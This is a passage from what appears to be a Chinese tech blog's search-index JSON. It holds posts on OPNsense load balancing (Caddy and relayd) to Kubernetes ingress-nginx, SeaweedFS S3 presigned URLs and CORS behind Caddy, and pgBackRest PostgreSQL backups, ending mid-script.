src=\"/posts/20251014-opnsense_caddy/image-20251014094437866.png\"\u003e\u003c/p\u003e\n\u003cp\u003e其它保持默认，然后去到Layer4 Proxy进行配置，同样要配2个，一个HTTP，一个TLS\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014094651852\" loading=\"lazy\" src=\"/posts/20251014-opnsense_caddy/image-20251014094651852.png\"\u003e\u003c/p\u003e\n\u003cp\u003e编辑HTTP的代理，注意 Domain 的地方需要把用到的所有域名列进去\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014094830397\" loading=\"lazy\" src=\"/posts/20251014-opnsense_caddy/image-20251014094830397.png\"\u003e\u003c/p\u003e\n\u003cp\u003e编译TLS的代理\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014095137803\" loading=\"lazy\" src=\"/posts/20251014-opnsense_caddy/image-20251014095137803.png\"\u003e\u003c/p\u003e\n\u003cp\u003e注意上面，Proxy Protocol都要选中v2，这样客户端真实IP才可以透传给后端的Nginx ingress\u003c/p\u003e\n\u003cp\u003e那同样后端的Nginx ingress的configmap，也需要加上Proxy Protocol的部分\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014095327561\" loading=\"lazy\" src=\"/posts/20251014-opnsense_caddy/image-20251014095327561.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们用的是官网的 ingress-nginx，配置文件是 ingress-nginx 的namespace中\u003c/p\u003e\n\u003cp\u003econfigmap ingress-nginx-controller，内容如下\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapiVersion: v1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  use-proxy-protocol: \u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekind: ConfigMap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emetadata:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  annotations:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    meta.helm.sh/release-name: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    meta.helm.sh/release-namespace: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    nginx.ingress.kubernetes.io/configuration-snippet: \u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    nginx.ingress.kubernetes.io/location-snippet: \u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    nginx.ingress.kubernetes.io/server-snippet: \u003cspan class=\"s2\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  creationTimestamp: \u003cspan class=\"s2\"\u003e\u0026#34;2025-08-27T07:38:49Z\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  labels:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/component: controller\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/instance: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/managed-by: Helm\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/name: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/part-of: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    app.kubernetes.io/version: 1.13.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    helm.sh/chart: ingress-nginx-4.13.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  name: ingress-nginx-controller\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  namespace: ingress-nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  resourceVersion: \u003cspan class=\"s2\"\u003e\u0026#34;22298827\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  uid: d6eeef3c-7e44-4667-854a-c7693006b221\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e编辑后，nginx ingress会自动reload\u003c/p\u003e","title":"OPNsense如何做LoadBalance接入后端的Kubernetes nginx ingress --- caddy篇"},{"content":"新托管了一个机房服务器，基本全用开源软件来构建：\n那Firewall就用的OPNsense，后端自建Kubernetes，那OPNsense需要当作一个LoadBalance来使用\n结构图如下，证书是放在了Nginx ingres上：\n那方法有很多，各有利弊，先说第一个，relayd的做法\nrelayd是最早的OPNsense的插件，用来做负载均衡，安装这个plugin插件\n配置如下：\nGeneral Settings：\n由于虚机的cpu是4个，所以进程设置成4\nBackend Hosts:\n后端节点有4个，只写IP即可\nTable Checks：\n端口检查，因为是直通，所以就设置成TCP检查即可\nTables：\nHosts选中4个节点\nVirtual Server：\n80和443各有一个\n每个呢，设置好前面的监听地址和端口，后端的Table 服务器和Table check的协议，就ok了\n最后去 General Settings 选中 Enable Relayd，然后save，就可以了\n这么多贴图，是因为如果从CLI配置，其实就一个很简单的relayd.conf文本文件\n但是从GUI，就一大堆，而且生成的东西简直不知所云\n这样做relayd就相当于一个直通的LoadBalance，把流量送入后端的Nginx ingress所开的NodePort。\n这样就可用了。\n这样有个弊端，Nginx的ingress拿不到客户端的真实IP，X-forwarded-for无法传过来真的客户端IP，网上查文档是可以的，但是从GUI配了半天，也不知道怎么配，服了也是。\n","permalink":"https://rendoumi.com/posts/20251014-opnsense_relayd/","summary":"\u003cp\u003e新托管了一个机房服务器，基本全用开源软件来构建：\u003c/p\u003e\n\u003cp\u003e那Firewall就用的OPNsense，后端自建Kubernetes，那OPNsense需要当作一个LoadBalance来使用\u003c/p\u003e\n\u003cp\u003e结构图如下，证书是放在了Nginx ingres上：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014091045980\" loading=\"lazy\" src=\"/posts/20251014-opnsense_relayd/image-20251014091045980.png\"\u003e\u003c/p\u003e\n\u003cp\u003e那方法有很多，各有利弊，先说第一个，\u003ccode\u003erelayd\u003c/code\u003e的做法\u003c/p\u003e\n\u003cp\u003erelayd是最早的OPNsense的插件，用来做负载均衡，安装这个plugin插件\u003c/p\u003e\n\u003cp\u003e配置如下：\u003c/p\u003e\n\u003cp\u003eGeneral Settings：\u003c/p\u003e\n\u003cp\u003e由于虚机的cpu是4个，所以进程设置成4\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014091310004\" loading=\"lazy\" src=\"/posts/20251014-opnsense_relayd/image-20251014091310004.png\"\u003e\u003c/p\u003e\n\u003cp\u003eBackend Hosts:\u003c/p\u003e\n\u003cp\u003e后端节点有4个，只写IP即可\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014091420120\" loading=\"lazy\" src=\"/posts/20251014-opnsense_relayd/image-20251014091420120.png\"\u003e\u003c/p\u003e\n\u003cp\u003eTable Checks：\u003c/p\u003e\n\u003cp\u003e端口检查，因为是直通，所以就设置成TCP检查即可\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014091530055\" loading=\"lazy\" src=\"/posts/20251014-opnsense_relayd/image-20251014091530055.png\"\u003e\u003c/p\u003e\n\u003cp\u003eTables：\u003c/p\u003e\n\u003cp\u003eHosts选中4个节点\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014091611417\" loading=\"lazy\" src=\"/posts/20251014-opnsense_relayd/image-20251014091611417.png\"\u003e\u003c/p\u003e\n\u003cp\u003eVirtual Server：\u003c/p\u003e\n\u003cp\u003e80和443各有一个\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014091724429\" loading=\"lazy\" src=\"/posts/20251014-opnsense_relayd/image-20251014091724429.png\"\u003e\u003c/p\u003e\n\u003cp\u003e每个呢，设置好前面的监听地址和端口，后端的Table 服务器和Table check的协议，就ok了\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014091927383\" loading=\"lazy\" src=\"/posts/20251014-opnsense_relayd/image-20251014091927383.png\"\u003e\u003c/p\u003e\n\u003cp\u003e最后去 General Settings 选中 Enable Relayd，然后save，就可以了\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251014092113972\" loading=\"lazy\" src=\"/posts/20251014-opnsense_relayd/image-20251014092113972.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这么多贴图，是因为如果从CLI配置，其实就一个很简单的relayd.conf文本文件\u003c/p\u003e\n\u003cp\u003e但是从GUI，就一大堆，而且生成的东西简直不知所云\u003c/p\u003e\n\u003cp\u003e这样做relayd就相当于一个直通的LoadBalance，把流量送入后端的Nginx ingress所开的NodePort。\u003c/p\u003e\n\u003cp\u003e这样就可用了。\u003c/p\u003e\n\u003cp\u003e这样有个弊端，Nginx的ingress拿不到客户端的真实IP，X-forwarded-for无法传过来真的客户端IP，网上查文档是可以的，但是从GUI配了半天，也不知道怎么配，服了也是。\u003c/p\u003e","title":"OPNsense如何做LoadBalance接入后端的Kubernetes nginx ingress --- relayd篇"},{"content":"SeaweedFS 已经用docker compose的方式部署在生产环境内中了，对外只开放了一个S3的端口127.0.0.1:8333，然后前面套上Caddy的https代理，这样很安全了。\n那进阶的要求又来了：\n一、S3的pre signed的URL 由于程序之前是在AWS跑的，所以用了S3的最佳实践，pre sign url来进行上传和下载，那seaweedfs也是完全支持的，基本是无缝修改\n给出验证程序：\nimport boto3 from botocore.client import Config # Configure the S3 client to point to your SeaweedFS S3 gateway s3_client = boto3.client( \u0026#39;s3\u0026#39;, endpoint_url=\u0026#39;https://s3.rendoumi.com\u0026#39;, # Replace with your SeaweedFS S3 gateway address aws_access_key_id=\u0026#39;aaaaaaaa\u0026#39;, aws_secret_access_key=\u0026#39;bbbbbbb\u0026#39;, config=Config(signature_version=\u0026#39;s3v4\u0026#39;) ) bucket_name = \u0026#39;myfiles\u0026#39; object_key = \u0026#39;your-object-key\u0026#39; expiration_seconds = 3600 # URL valid for 1 hour # Generate a pre-signed URL for uploading (PUT) try: upload_url = s3_client.generate_presigned_url( \u0026#39;put_object\u0026#39;, Params={\u0026#39;Bucket\u0026#39;: bucket_name, \u0026#39;Key\u0026#39;: object_key, \u0026#39;ContentType\u0026#39;: \u0026#39;application/octet-stream\u0026#39;}, ExpiresIn=expiration_seconds ) print(f\u0026#34;Pre-signed URL for upload: {upload_url}\u0026#34;) except Exception as e: print(f\u0026#34;Error generating upload URL: {e}\u0026#34;) # Generate a pre-signed URL for downloading (GET) try: download_url = s3_client.generate_presigned_url( \u0026#39;get_object\u0026#39;, Params={\u0026#39;Bucket\u0026#39;: bucket_name, \u0026#39;Key\u0026#39;: object_key}, ExpiresIn=expiration_seconds ) print(f\u0026#34;Pre-signed URL for download: {download_url}\u0026#34;) except Exception as e: print(f\u0026#34;Error generating download URL: {e}\u0026#34;) 能看到临时生成的upload的URL和download的URL，是完美支持的\n二、s3的域名代理 那aws的s3桶默认是有个域名的bucket.ap-southease-1\u0026hellip;\u0026hellip;，前面也可以套上Cloudfront把桶做成静态网站的CDN\n那迁移的话，做法也有两种，一是CDN厂家直接支持源端是S3桶，那这种就好办了，直接配置即可\n第二种就是没有这功能，那只能把seaweedfs的filter的暴露出来，然后让CDN厂家http回源\n那做法也很简单，修改docker -compose.yaml放开8888端口\nservices: seaweedfs-s3: image: chrislusf/seaweedfs container_name: seaweedfs-s3 volumes: - ./data:/data - ./config/config.json:/seaweedfs/config.json ports: - \u0026#34;127.0.0.1:8333:8333\u0026#34; - \u0026#34;127.0.0.1:8888:8888\u0026#34; entrypoint: /bin/sh -c command: | \u0026#34;echo \u0026#39;Starting SeaweedFS S3 server\u0026#39; \u0026amp;\u0026amp; \\ weed server -dir=/data -volume.max=100 -s3 -s3.config /seaweedfs/config.json\u0026#34; restart: unless-stopped 然后用Caddy进行反代，Caddyfile如下：\ns3.rendoumi.com { reverse_proxy 127.0.0.1:8333 } mybucket.s3.rendoumi { rewrite * /buckets/mybucket{uri} reverse_proxy http://127.0.0.1:8888 } 上面有一点要注意，seaweedfs暴漏出的8888端口可以看到所有桶，都在/buckets下，我们只想暴漏mybucket的话，就需要对url进行改写。\n三、s3的cors 程序里居然还用到了s3的core，那比较麻烦了，万幸的是seaweedfs居然也支持！！！\n链接：https://github.com/seaweedfs/seaweedfs/wiki/S3-CORS\n我们只限制 mybucket 的桶的cors，先准备一个cors.xml文件\n\u0026lt;CORSConfiguration\u0026gt; \u0026lt;CORSRule\u0026gt; \u0026lt;AllowedOrigin\u0026gt;https://www.rendoumi.com\u0026lt;/AllowedOrigin\u0026gt; \u0026lt;AllowedOrigin\u0026gt;https://mybucket.rendoumi.com\u0026lt;/AllowedOrigin\u0026gt; \u0026lt;AllowedOrigin\u0026gt;https://*.rendoumi.com\u0026lt;/AllowedOrigin\u0026gt; \u0026lt;AllowedOrigin\u0026gt;https://mybucket.fcdn.net\u0026lt;/AllowedOrigin\u0026gt; \u0026lt;AllowedMethod\u0026gt;GET\u0026lt;/AllowedMethod\u0026gt; \u0026lt;AllowedMethod\u0026gt;POST\u0026lt;/AllowedMethod\u0026gt; \u0026lt;AllowedMethod\u0026gt;PUT\u0026lt;/AllowedMethod\u0026gt; \u0026lt;AllowedMethod\u0026gt;HEAD\u0026lt;/AllowedMethod\u0026gt; \u0026lt;AllowedMethod\u0026gt;DELETE\u0026lt;/AllowedMethod\u0026gt; \u0026lt;AllowedHeader\u0026gt;*\u0026lt;/AllowedHeader\u0026gt; \u0026lt;ExposeHeader\u0026gt;ETag\u0026lt;/ExposeHeader\u0026gt; \u0026lt;ExposeHeader\u0026gt;Access-Control-Allow-Origin\u0026lt;/ExposeHeader\u0026gt; \u0026lt;MaxAgeSeconds\u0026gt;3600\u0026lt;/MaxAgeSeconds\u0026gt; \u0026lt;/CORSRule\u0026gt; \u0026lt;/CORSConfiguration\u0026gt; 这个是真无语，因为minio的mc只支持这个模式，不支持json（或者是自己没找到json的配法）\n然后用mc推进去即可\nmc cors set mys3/mybucket /data/weedfs/cors.xml mc cors get mys3/mybucket 这样就搞定了。\n","permalink":"https://rendoumi.com/posts/20250917-seaweedfs_prod/","summary":"\u003cp\u003eSeaweedFS 已经用docker compose的方式部署在生产环境内中了，对外只开放了一个S3的端口127.0.0.1:8333，然后前面套上Caddy的https代理，这样很安全了。\u003c/p\u003e\n\u003cp\u003e那进阶的要求又来了：\u003c/p\u003e\n\u003ch5 id=\"一s3的pre-signed的url\"\u003e一、S3的pre signed的URL\u003c/h5\u003e\n\u003cp\u003e由于程序之前是在AWS跑的，所以用了S3的最佳实践，pre sign url来进行上传和下载，那seaweedfs也是完全支持的，基本是无缝修改\u003c/p\u003e\n\u003cp\u003e给出验证程序：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport boto3\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efrom botocore.client import Config\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Configure the S3 client to point to your SeaweedFS S3 gateway\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003es3_client\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e boto3.client\u003cspan class=\"o\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s1\"\u003e\u0026#39;s3\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eendpoint_url\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;https://s3.rendoumi.com\u0026#39;\u003c/span\u003e,  \u003cspan class=\"c1\"\u003e# Replace with your SeaweedFS S3 gateway address\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eaws_access_key_id\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;aaaaaaaa\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eaws_secret_access_key\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;bbbbbbb\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003econfig\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eConfig\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003esignature_version\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;s3v4\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ebucket_name\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;myfiles\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eobject_key\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;your-object-key\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eexpiration_seconds\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e3600\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# URL valid for 1 hour\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Generate a pre-signed URL for uploading (PUT)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etry:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eupload_url\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e s3_client.generate_presigned_url\u003cspan class=\"o\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s1\"\u003e\u0026#39;put_object\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eParams\u003c/span\u003e\u003cspan class=\"o\"\u003e={\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Bucket\u0026#39;\u003c/span\u003e: bucket_name, \u003cspan class=\"s1\"\u003e\u0026#39;Key\u0026#39;\u003c/span\u003e: object_key, \u003cspan class=\"s1\"\u003e\u0026#39;ContentType\u0026#39;\u003c/span\u003e: \u003cspan class=\"s1\"\u003e\u0026#39;application/octet-stream\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eExpiresIn\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eexpiration_seconds\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    print\u003cspan class=\"o\"\u003e(\u003c/span\u003ef\u003cspan class=\"s2\"\u003e\u0026#34;Pre-signed URL for upload: {upload_url}\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eexcept Exception as e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    print\u003cspan class=\"o\"\u003e(\u003c/span\u003ef\u003cspan class=\"s2\"\u003e\u0026#34;Error generating upload URL: {e}\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Generate a pre-signed URL for downloading (GET)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etry:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003edownload_url\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e s3_client.generate_presigned_url\u003cspan class=\"o\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s1\"\u003e\u0026#39;get_object\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eParams\u003c/span\u003e\u003cspan class=\"o\"\u003e={\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Bucket\u0026#39;\u003c/span\u003e: bucket_name, \u003cspan class=\"s1\"\u003e\u0026#39;Key\u0026#39;\u003c/span\u003e: object_key\u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eExpiresIn\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eexpiration_seconds\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    print\u003cspan class=\"o\"\u003e(\u003c/span\u003ef\u003cspan class=\"s2\"\u003e\u0026#34;Pre-signed URL for download: {download_url}\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eexcept Exception as e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    print\u003cspan class=\"o\"\u003e(\u003c/span\u003ef\u003cspan class=\"s2\"\u003e\u0026#34;Error generating download URL: {e}\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e能看到临时生成的upload的URL和download的URL，是完美支持的\u003c/p\u003e","title":"seaweedfs的s3进阶试用方法"},{"content":"最近狠折腾了一通postgres的备份，跟MySQL的阿里RDB恢复一样，如何不停止数据库服务，恢复某个表的数据到某个时间点，然后放到另一个表中呢？\n其实用之前的wal恢复一样的，就是要把当天实例的全备份和wal都复制到另外一台上，然后恢复，再把数据给dump下来，再建一个新表，把数据导回去。\nPostgres的wal和PITR时间点恢复\n用pgbackrest感觉会好一些，其实都差不多，步骤如下：\n一、安装并配置pgbackrest apt install pgbackrest # 建立备份的大本营 mkdir -p /var/lib/pgbackrest chmod 750 /var/lib/pgbackrest chown postgres:postgres /var/lib/pgbackrest # 编辑 /etc/pgbackrest.conf [global] repo1-path=/var/lib/pgbackrest repo1-retention-full=26 repo1-retention-archive=180 log-level-file=info log-level-console=info [global:archive-push] compress-level=3 [main] pg1-path=/var/lib/postgresql/13/main pg1-port=5432 讲解一下参数\nglobal里面是全局配置\nrepo1-path=/var/lib/pgbackrest # pgBackRest 存储库路径 repo1-retention-full=26 # 保留最近的 26 个全量备份，大概6个月，180天 repo1-retention-archive=180 # 保留最近 180 天的 WAL 日志 log-level-file=info # 文件日志级别 log-level-console=info # 控制台日志级别 global:archive-push 设置的是wal归档的保存方式是压缩保存\nmain部分设置的是要备份的postgres源的路径和端口，【main】是stanza的名字\n上面的备份其实有三种备份，full和incr和wal备份，那如果full和增量都没了，只要wal还在，那么依然能恢复到180天之内的某个时间点。wal很占空间，full也很占空间，一定要算准了。\n那其实pgbackrest是用postgres身份去执行命令的，所以不用认证身份。\n二、配置postgres vi /etc/postgresql/13/main/postgresql.conf # wal归档方法： #archive_mode = on #archive_command = \u0026#39;cp %p /data/backup/%f\u0026#39; # pgbackrest归档方法： archive_mode = on archive_command = \u0026#39;pgbackrest --stanza=main archive-push %p\u0026#39; wal_level = replica #备份级别是副本 max_wal_senders = 3 #最多wal日志发到3个客户端去 # 需要重启postgres systemctl restart postgresql 三、测试pgbackrest的备份功能 # 建立一个stanza sudo -u postgres pgbackrest --stanza=main --log-level-console=info stanza-create # 检查 sudo -u postgres pgbackrest --stanza=main --log-level-console=info check # 查看信息 sudo -u postgres pgbackrest info 看到如上信息就ok了。\n四、正式的full和incr备份 全量备份的脚本full.sh：\n#!/bin/bash # 设置 pgBackRest 的相关参数和变量 PG_BACKREST_COMMAND=\u0026#34;/usr/bin/pgbackrest\u0026#34; STANZA=\u0026#34;main\u0026#34; LOG_FILE=\u0026#34;/var/log/pgbackrest_full_backup.log\u0026#34; # 执行全量备份 sudo -u postgres ${PG_BACKREST_COMMAND} --stanza=${STANZA} --log-level-console=info backup --type=full \u0026gt;\u0026gt; ${LOG_FILE} 2\u0026gt;\u0026amp;1 # 检测备份是否成功 if [ $? -eq 0 ]; then echo \u0026#34;$(date \u0026#39;+%Y-%m-%d %H:%M:%S\u0026#39;) - Full Backup Completed Successfully\u0026#34; \u0026gt;\u0026gt; ${LOG_FILE} else echo \u0026#34;$(date \u0026#39;+%Y-%m-%d %H:%M:%S\u0026#39;) - Full Backup Failed\u0026#34; \u0026gt;\u0026gt; ${LOG_FILE} fi 增量备份的脚本incr.sh\n#!/bin/bash # 设置 pgBackRest 相关参数 PG_BACKREST_COMMAND=\u0026#34;/usr/bin/pgbackrest\u0026#34; STANZA=\u0026#34;main\u0026#34; LOG_FILE=\u0026#34;/var/log/pgbackrest_incr_backup.log\u0026#34; # 执行增量备份 sudo -u postgres 